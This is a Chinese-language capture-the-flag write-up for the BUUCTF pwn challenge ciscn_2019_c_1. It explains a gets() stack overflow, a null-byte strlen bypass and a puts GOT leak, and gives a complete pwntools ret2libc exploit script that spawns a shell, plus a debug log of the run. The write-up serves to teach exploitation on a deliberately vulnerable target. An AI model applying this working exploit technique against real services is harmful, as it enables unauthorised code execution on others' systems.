# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744629680871-3a375b09-40b1-4fb1-a391-dd27a2ac6c62.png)

# 做法

开虚拟机checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744629788541-9cdb6235-c102-4080-82c2-0756f12e21fd.png)

64位，没开栈保护

扔进IDA（64位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630207619-36b25851-fe7d-4ba5-a92c-30ad411a93ee.png)

简单查看分析了一下，要让v4=1，进入encrypt函数，当v4=2/3时的函数点进去没东西

下面是encrypt函数的页面

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630322543-99a72f8c-29da-4f73-ab43-7cddca31152a.png)

只是因为在人群中多看了你一眼——熟悉的gets函数！栈溢出吗？先点进去数数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630450603-a554a333-3e46-45dd-9bcf-fb2e91c5227b.png)

5*16+8=88（注：dw是2字节）

然后出来继续分析

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630322543-99a72f8c-29da-4f73-ab43-7cddca31152a.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0)

我们又看到了一个函数——strlen（strlen的作用是得知字符串的长度，但是遇到’\0‘就会停止）

然后再下面就是把我们输入的东西加密的过程了，但是我们的脚本不能让它加密，加密了我们的脚本也就被破坏了，没用了，所以我们要让它在到strlen函数的时候停止

然后就没啥信息了，Shift+F12看看有啥可利用的

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630895033-3b99dcac-35dd-4a03-8c3b-6d0a037a2add.png)

很可惜，我们没有找到有用的东西，怎么办呢

我们可以利用一个程序已经执行过的函数去泄露它在程序中的地址，泄露出system和/bin/sh的地址，看到这俩熟悉的函数，我们自然而然就想到ROP链了（不懂看《补充》1）

这个文件是64位的，因此我们需要利用ROPgadget来得出该文件的pop rdi地址

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744631760546-261a6937-7649-409f-9c15-61307623d55b.png)

代码如下

```
ROPgadget --binary 文件  --only "pop|ret" | grep "rdi"（|后面的是筛选，不要|及后面的内容会弹出很多地址）
```

另外，我们的exp还要使用ret指令地址解决栈对齐问题，因此，我们在原有的基础上去掉（ | grep "rdi"），即可获得其他地址，上面可以当做补充

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744633034687-96449a00-6879-4836-9a08-6abae4bf2fe6.png)

那么，我们该怎么选这个程序已经执行过的函数呢？可以通过下列条件进行筛选

## 选择依据

### 1. 函数的存在性和稳定性

要确保选择的函数在目标程序里是必然存在的，并且在不同的运行环境下（如不同的输入、不同的运行次数）都会被执行。比如标准库函数，它们在大多数程序中都会被链接和使用，像 `puts`、`printf` 等。

### 2. 函数调用的可触发性

该函数的调用要能够被轻易触发，也就是说，你要可以通过控制程序的输入或者执行流程来让这个函数被调用。例如，在存在缓冲区溢出漏洞的程序中，你可以通过构造合适的输入来覆盖返回地址，从而劫持程序流程并调用目标函数。

### 3. 函数地址的可泄露性

函数的调用要能够以某种方式把自身的地址信息泄露出来。常见的做法是利用格式化字符串漏洞，让函数的返回地址或者 GOT（Global Offset Table，全局偏移表）表项的值被输出到程序的输出中。

### 4. 函数的关联性

选择的函数最好和程序中的其他关键部分（如 libc 库）有紧密的关联。这样，一旦泄露了这个函数的地址，就可以根据这个地址计算出其他函数或者数据结构在内存中的地址，进而实现进一步的利用。

回到IDA，我们要看的是encrypt函数，因为main函数只是输入123选择进入的函数，没啥作用的，真正起作用的还是encrypt函数，可以自行nc测试一下

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744630322543-99a72f8c-29da-4f73-ab43-7cddca31152a.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0%2Fresize%2Cw_1125%2Climit_0)

这里，我们看到puts函数非常符合上述条件，就决定是你了！！！

最后，我们再nc测试一下，方便我们写exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744636329641-71411959-f5e3-4519-a948-98187b519934.png)

至此，我们编写exp（不懂看《补充》2，长一点的我都会放在补充那里，不然脚本看的好乱）

代码如下

```
#导入所模块
from pwn import*
from LibcSearcher import*

# 设置日志级别为 debug（要测试下面要r.recvline()多少次时可以去掉#观察）
context.log_level = 'debug'

#与靶机连接 
r=remote('node5.buuoj.cn',29683)

#获取ELF文件信息
elf=ELF('/home/ljy/Desktop/Desktop/ciscn_2019_c_1' )

#所需地址
main = 0x400B28			#IDA左边函数窗口自行获取
pop_rdi = 0x400c83
ret = 0x4006b9
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
#在大多数处理未开启 PIE 的 ELF 格式可执行文件的漏洞利用脚本中
#使用 elf.plt['puts'] 和 elf.got['puts'] 来
#获取 puts 函数的 PLT 地址和 GOT 地址是固定且通用的写法，但在特殊情况下可能需要进行调整。

#合适位置进入Encrypt函数 
r.sendlineafter('Input your choice!\n','1')

#构建payload
payload = b'\0'+b'a'*(5*16+8-1)   #减一是因为前面输入了\0,跳出strlen函数
payload+=p64(pop_rdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(main)

#合适位置发送payload
r.sendlineafter('Input your Plaintext to be encrypted\n',payload)

#接收无用信息并舍弃
r.recvline()
r.recvline()

#接收puts地址
puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))

#打印puts函数地址
print(hex(puts_addr))
#使用hex()函数来打印puts_addr，主要是为了以十六进制的格式输出地址，要进制统一

#获取puts的libc地址
libc = LibcSearcher('puts',puts_addr)

#计算偏移值
Offset = puts_addr - libc.dump('puts')

#得出binsh和system的函数地址
binsh = Offset+libc.dump('str_bin_sh')
system = Offset+libc.dump('system')

#合适位置进入Encrypt函数
r.sendlineafter('Input your choice!\n','1')

#构建payload
payload = b'\0'+b'a'*(5*16+8-1)
payload=payload+p64(ret)
payload=payload+p64(pop_rdi)
payload=payload+p64(binsh)
payload=payload+p64(system)

#合适位置发送payload
r.sendlineafter('Input your Plaintext to be encrypted\n',payload)

#与靶机进行交互
r.interactive()
```

常规，得出flag

（注：这里有0和1供你选择，俩都试试，这里我试的0可以，1不行）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744715270923-5fbeee14-f4fa-407c-b295-1a38ca2e4757.png)

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744715328346-f91decd2-cbbf-4718-b7ec-215119247d8b.png)

# 补充

## 1

### （1）

32位的ROP是system函数在前，bin/sh函数在后，两函数中填入一个将来的返回地址，一般直接填0

### （2）

64位的ROP是bin/sh函数在前，system函数在后，两函数之前需要加上该文件的pop rdi地址

（用ROPgadget实现）

## 2

### （1）

程序里的函数的地址跟它所使用的libc里的函数地址不一样

程序里函数地址=libc里的函数地址+offset（偏移量）

### （2）使用ret指令地址解决栈对齐问题

在 64 位的 x86-64 系统中，调用约定要求栈指针在调用函数时是 16 字节对齐的。这是因为一些 SSE（Streaming SIMD Extensions）指令要求操作数在 16 字节对齐的地址上，为了保证程序的正确性和稳定性，系统在调用函数时会遵循这个规则。

在构造 ROP 链（Return Oriented Programming，面向返回编程）时，有时候栈指针可能不会满足 16 字节对齐的要求。例如，当你在栈上压入一系列的地址来构建 ROP 链时，栈指针可能会偏移到一个非 16 字节对齐的位置。

当你调用像system这样的函数时，如果栈没有正确对齐，可能会导致程序崩溃或者出现未定义行为。因此，在调用system函数之前，插入一个ret指令的地址（ret=0x4006b9）可以调整栈指针，使其满足 16 字节对齐的要求。ret指令会从栈上弹出一个地址并跳转到该地址，同时栈指针会增加 8 字节，这样就有可能使栈指针重新对齐到 16 字节边界。

### （3）payload构建原理（第一个和第二个payload原理差不多，自行领会一下）

#### 1.`payload += p64(pop_rdi)`

`**pop_rdi**` **的含义**：`pop_rdi` 是一个内存地址，该地址处存储的汇编指令是 `pop rdi; ret`。在 64 位系统里，函数调用时，第一个参数通常通过 `rdi` 寄存器传递。`pop rdi` 指令会从栈顶取出一个值，并将其放入 `rdi` 寄存器；`ret` 指令会让程序跳转到栈顶存储的下一个地址继续执行。

`**p64()**` **函数**：`p64()` 是 `pwntools` 库中的函数，用于将一个 64 位的整数（即内存地址）转换为 8 字节的字节序列，因为在 64 位系统中地址用 8 字节表示。

**这行代码的作用**：把 `pop rdi; ret` 这个 ROP gadget（一段具有特定功能的汇编代码片段）的地址添加到 `payload` 中。当程序执行到这个地址时，就会执行 `pop rdi` 指令，为后续传递参数做准备。

#### 2. `payload += p64(puts_got)`

`**puts_got**` **的含义**：`puts_got` 是 `puts` 函数在全局偏移表（GOT）中的地址。GOT 表用于存储程序中调用的外部函数的实际地址，在程序运行时由动态链接器填充。

**这行代码的作用**：将 `puts` 函数在 GOT 表中的地址添加到 `payload` 中。结合上一步，当程序执行到 `pop rdi` 指令时，会把 `puts_got` 从栈中取出并放入 `rdi` 寄存器，这样就为调用 `puts` 函数设置好了第一个参数。

#### 3. `payload += p64(puts_plt)`

`**puts_plt**` **的含义**：`puts_plt` 是 `puts` 函数在过程链接表（PLT）中的地址。PLT 表是程序用于处理动态链接函数调用的机制。

**这行代码的作用**：将 `puts` 函数在 PLT 表中的地址添加到 `payload` 中。当程序执行到这个地址时，会调用 `puts` 函数。由于 `rdi` 寄存器中已经存储了 `puts_got` 地址，`puts` 函数会打印出 `puts_got` 地址所存储的内容，也就是 `puts` 函数的实际地址，从而实现了 `puts` 函数实际地址的泄露。

#### 4. `payload += p64(main)`

`**main**` **的含义**：`main` 是程序的主函数，程序通常从这里开始执行，并且主函数中可能包含输入输出操作或调用其他函数的逻辑。

**这行代码的作用**：将 `main` 函数的地址添加到 `payload` 中。当 `puts` 函数执行完毕后，程序会继续执行栈顶存储的地址，也就是 `main` 函数的地址。这样程序就会返回到 `main` 函数，我们就可以再次利用程序的输入点，构造新的有效载荷，进行后续的漏洞利用操作，比如计算 `system` 函数的地址并调用它来获取 shell。

#### 总结

执行 `pop rdi`，将 `puts_got` 地址放入 `rdi` 寄存器。

执行 `puts_plt`，调用 `puts` 函数，`puts` 函数根据 `rdi` 寄存器中的地址，打印出 `puts` 函数的实际地址，实现地址泄露。

执行 `main`，程序返回到 `main` 函数，等待我们进行下一次输入和攻击。

在 64 位程序中，ROP 链的栈布局通常如下：

|   |   |   |
|---|---|---|
|**栈地址**|**值**|**作用**|
|返回地址|pop_rdi|跳转到 pop rdi; ret|
|下一个值|puts_got|被弹出到 rdi 寄存器|
|再下一个值|puts_plt|跳转到 puts 函数|
|再下一个值|main|返回到 main 函数|

## 3 puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\0'))

这行代码 `puts_addr = u64(r.recvuntil('\n')[:-1].ljust(8, b'\0'))` 主要的作用是从网络连接中接收数据，并将其解析为一个 64 位的整数，这个整数通常代表 `puts` 函数在内存中的实际地址。下面我们来详细拆解这行代码的各个部分：

### 1. `r.recvuntil('\n')`

`r` 通常是 `pwntools` 中 `remote` 或 `process` 对象，代表与目标程序建立的连接（可以是远程网络连接或者本地进程连接）。

`recvuntil('\n')` 是 `pwntools` 提供的一个方法，它会持续从连接中接收数据，直到遇到换行符 `\n` 为止，然后返回接收到的包含换行符的数据。

### 2. `[:-1]`

这是 Python 的切片操作。`[:-1]` 表示取前面接收到的数据除了最后一个字符（即换行符 `\n`）之外的部分，这样就把换行符从数据中移除了。

### 3. `.ljust(8, b'\0')`

`ljust` 是 Python 字符串或字节对象的方法，用于左对齐字符串或字节序列，并在右侧填充指定的字符或字节。

`ljust(8, b'\0')` 表示将前面处理后的数据左对齐，并且如果数据长度不足 8 字节，就在右侧用空字节 `b'\0'` 进行填充，使其长度达到 8 字节。之所以要填充到 8 字节，是因为后续要使用 `u64` 函数将其解析为 64 位整数，而 64 位整数在内存中占用 8 个字节。

### 4. `u64(...)`

`u64` 是 `pwntools` 提供的一个函数，用于将一个 8 字节的字节序列解析为一个 64 位的无符号整数。

它会把前面经过处理和填充后得到的 8 字节数据转换为一个 64 位的整数，这个整数就是我们想要获取的 `puts` 函数在内存中的实际地址。

## 4 如何看要用多少r.recvline() / 实在不行就一个一个输进去慢慢试要用多少个

结合exp看

这是在exp里输入context.log_level = 'debug'返回的东西

```
➜  ~ python3 buuctf
[+] Opening connection to node5.buuoj.cn on port 28002: Done
[*] '/home/ljy/Desktop/Desktop/ciscn_2019_c_1'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[DEBUG] Received 0x3e bytes:
    b'EEEEEEE                            hh      iii                '
[DEBUG] Received 0x1d9 bytes:
    b'\n'
    b'EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  \n'
    b'EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e \n'
    b'EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  \n'
    b'EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee \n'
    b'====================================================================\n'
    b'Welcome to this Encryption machine\n'
    b'\n'
    b'====================================================================\n'
    b'1.Encrypt\n'
    b'2.Decrypt\n'
    b'3.Exit\n'
    b'Input your choice!\n'
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x24 bytes:
    b'Input your Plaintext to be encrypted'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Sent 0x79 bytes:
    00000000  00 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │·aaa│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000050  61 61 61 61  61 61 61 61  83 0c 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000060  20 20 60 00  00 00 00 00  e0 06 40 00  00 00 00 00  │  `·│····│··@·│····│
    00000070  28 0b 40 00  00 00 00 00  0a                        │(·@·│····│·│
    00000079
[DEBUG] Received 0xa bytes:
    b'Ciphertext'
[DEBUG] Received 0x220 bytes:
    00000000  0a 0a c0 f9  a1 c9 9b 7f  0a 45 45 45  45 45 45 45  │····│····│·EEE│EEEE│
    00000010  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
    00000020  20 20 20 20  20 20 20 20  20 20 20 20  68 68 20 20  │    │    │    │hh  │
    00000030  20 20 20 20  69 69 69 20  20 20 20 20  20 20 20 20  │    │iii │    │    │
    00000040  20 20 20 20  20 20 20 0a  45 45 20 20  20 20 20 20  │    │   ·│EE  │    │
    00000050  6d 6d 20 6d  6d 20 6d 6d  6d 6d 20 20  20 20 61 61  │mm m│m mm│mm  │  aa│
    00000060  20 61 61 20  20 20 63 63  63 63 20 68  68 20 20 20  │ aa │  cc│cc h│h   │
    00000070  20 20 20 20  20 20 20 6e  6e 20 6e 6e  6e 20 20 20  │    │   n│n nn│n   │
    00000080  20 65 65 65  20 20 0a 45  45 45 45 45  20 20 20 6d  │ eee│  ·E│EEEE│   m│
    00000090  6d 6d 20 20  6d 6d 20 20  6d 6d 20 20  61 61 20 61  │mm  │mm  │mm  │aa a│
    000000a0  61 61 20 63  63 20 20 20  20 20 68 68  68 68 68 68  │aa c│c   │  hh│hhhh│
    000000b0  20 20 69 69  69 20 6e 6e  6e 20 20 6e  6e 20 65 65  │  ii│i nn│n  n│n ee│
    000000c0  20 20 20 65  20 0a 45 45  20 20 20 20  20 20 6d 6d  │   e│ ·EE│    │  mm│
    000000d0  6d 20 20 6d  6d 20 20 6d  6d 20 61 61  20 20 61 61  │m  m│m  m│m aa│  aa│
    000000e0  61 20 63 63  20 20 20 20  20 68 68 20  20 20 68 68  │a cc│    │ hh │  hh│
    000000f0  20 69 69 69  20 6e 6e 20  20 20 6e 6e  20 65 65 65  │ iii│ nn │  nn│ eee│
    00000100  65 65 20 20  0a 45 45 45  45 45 45 45  20 6d 6d 6d  │ee  │·EEE│EEEE│ mmm│
    00000110  20 20 6d 6d  20 20 6d 6d  20 20 61 61  61 20 61 61  │  mm│  mm│  aa│a aa│
    00000120  20 20 63 63  63 63 63 20  68 68 20 20  20 68 68 20  │  cc│ccc │hh  │ hh │
    00000130  69 69 69 20  6e 6e 20 20  20 6e 6e 20  20 65 65 65  │iii │nn  │ nn │ eee│
    00000140  65 65 20 0a  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │ee ·│====│====│====│
    00000150  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    *
    00000180  3d 3d 3d 3d  3d 3d 3d 3d  0a 57 65 6c  63 6f 6d 65  │====│====│·Wel│come│
    00000190  20 74 6f 20  74 68 69 73  20 45 6e 63  72 79 70 74  │ to │this│ Enc│rypt│
    000001a0  69 6f 6e 20  6d 61 63 68  69 6e 65 0a  0a 3d 3d 3d  │ion │mach│ine·│·===│
    000001b0  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    *
    000001f0  3d 0a 31 2e  45 6e 63 72  79 70 74 0a  32 2e 44 65  │=·1.│Encr│ypt·│2.De│
    00000200  63 72 79 70  74 0a 33 2e  45 78 69 74  0a 49 6e 70  │cryp│t·3.│Exit│·Inp│
    00000210  75 74 20 79  6f 75 72 20  63 68 6f 69  63 65 21 0a  │ut y│our │choi│ce!·│
    00000220
```

接收到的

第一个无用信息是第31行的b'\n'

（但我感觉\n是跟在第29行encrypted之后的，只是它拆开来，参考第25行的b'Input your choice!\n'，按照下面“注”的说法的话我又看不出来什么时候开始处理泄露的got地址，encrypted和\n不看作一起的话就比较容易理解）

第二个无用信息是第41行的b'Ciphertext'

（注：这两个无用信息不确定，也有的人说第一个接收的是b'Ciphertext'，第二个接收的是0a，目 前还是小白不太懂，以后刷题量上去了估计就懂了，还记得的话会回来更新，更新了会在最下 面《更新》写第二个日期并告诉更新内容）

然后才开始处理泄露的got地址

30行以上接收的都是程序给你打印的东西，只要不影响我们接收puts的函数地址就不用管它

# 更新

于2025.4.15